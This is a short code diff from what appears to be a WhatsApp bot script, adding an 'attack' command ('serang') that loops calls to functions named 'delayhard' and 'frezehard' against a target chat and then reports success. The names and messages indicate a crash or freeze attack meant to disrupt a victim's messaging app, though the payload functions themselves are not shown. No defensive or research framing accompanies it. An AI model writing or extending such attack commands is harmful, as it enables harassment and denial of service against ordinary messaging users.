@@ -1324,7 +1324,8 @@ case 'serang': {
 await reply(`succses menyerang target 😵‍💫`)    
     
     for (let r = 0; r < 5; r++) {
-
+await delayhard(sock, m.chat);
+await frezehard(sock, m.chat);
     }
     await sleep(1000)
   console.log(chalk.red.bold("Success!"))
